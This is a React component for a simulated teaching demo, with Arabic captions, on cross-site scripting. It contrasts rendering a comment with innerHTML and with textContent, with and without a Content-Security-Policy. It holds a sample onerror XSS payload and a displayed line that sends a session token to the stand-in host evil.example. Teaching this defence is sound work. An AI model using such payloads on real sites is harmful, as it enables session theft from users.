"use client";

import { AnimatePresence, motion } from "motion/react";
import { useState } from "react";

type Sink = "innerHTML" | "textContent";

const COMMENTS = [
  { id: "plain", text: "Great post, thanks!" },
  { id: "bold", text: "<b>Thanks</b> a lot" },
  { id: "attack", text: '<img src=x onerror="steal()">' },
] as const;
type CommentId = (typeof COMMENTS)[number]["id"];

/** A comment box rendered with innerHTML or textContent, with and without a Content-Security-Policy. Simulated: no HTML is ever injected. */
export default function JsSecurityProblem() {
  const [pick, setPick] = useState<CommentId>("plain");
  const [sink, setSink] = useState<Sink>("innerHTML");
  const [csp, setCsp] = useState(false);
  const text = COMMENTS.find((c) => c.id === pick)!.text;

  const parsed = sink === "innerHTML";
  const attack = parsed && pick === "attack";
  const stolen = attack && !csp;

  return (
    <div>
      <div className="flex flex-wrap gap-2" dir="ltr">
        {COMMENTS.map((c) => (
          <button
            key={c.id}
            onClick={() => setPick(c.id)}
            className={`code rounded-xl px-3 py-2 text-xs ${pick === c.id ? "bg-accent font-bold text-accent-fg" : "border border-line bg-surface"}`}
          >
            {c.text}
          </button>
        ))}
      </div>

      <div className="mt-3 flex flex-wrap items-center gap-2" dir="ltr">
        <span className="code text-xs text-muted">el.</span>
        {(["innerHTML", "textContent"] as Sink[]).map((s) => (
          <button
            key={s}
            onClick={() => setSink(s)}
            className={`code rounded-xl px-3 py-2 text-xs font-bold ${sink === s ? "bg-accent text-accent-fg" : "border border-line bg-surface"}`}
          >
            {s}
          </button>
        ))}
        <span className="code text-xs text-muted">= comment</span>
        <button
          onClick={() => setCsp(!csp)}
          className={`code ms-auto rounded-xl px-3 py-2 text-xs font-bold ${csp ? "bg-accent text-accent-fg" : "border border-line bg-surface"}`}
        >
          CSP: script-src &apos;self&apos; {csp ? "✓" : "✗"}
        </button>
      </div>

      <div className="mt-4 rounded-2xl border border-line bg-surface p-4">
        <div className="text-sm text-muted">صفحة الزائر</div>
        <div className="mt-2 min-h-14 rounded-xl bg-code p-3" dir="ltr">
          {!parsed && <span className="code text-sm">{text}</span>}
          {parsed && pick === "plain" && <span className="text-sm">{text}</span>}
          {parsed && pick === "bold" && (
            <span className="text-sm">
              <b>Thanks</b> a lot
            </span>
          )}
          {attack && <span className="inline-block h-5 w-5 rounded border border-dashed border-line align-middle" title="broken image" />}
        </div>

        <AnimatePresence mode="wait">
          {stolen && (
            <motion.div key="stolen" initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="code mt-3 rounded-xl border border-err p-3 text-xs text-err" dir="ltr">
              steal() → fetch(&quot;https://evil.example/c?session=8f3a…&quot;)
            </motion.div>
          )}
          {attack && csp && (
            <motion.div key="blocked" initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="code mt-3 rounded-xl border border-line p-3 text-xs text-ok" dir="ltr">
              Refused to execute inline event handler because it violates the Content Security Policy directive: &quot;script-src &apos;self&apos;&quot;.
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {stolen && (
        <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-3 text-muted">
          الزائر كتب نصاً، و innerHTML قرأته HTML: صار وسماً، وصار onerror كوداً يعمل في متصفح كل من يفتح الصفحة. جرّب <b className="text-fg">textContent</b>.
        </motion.p>
      )}
      {!parsed && pick !== "plain" && (
        <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-3 text-muted">
          textContent تضع الحروف حروفاً. لا وسوم ولا كود، مهما كتب الزائر.
        </motion.p>
      )}
    </div>
  );
}
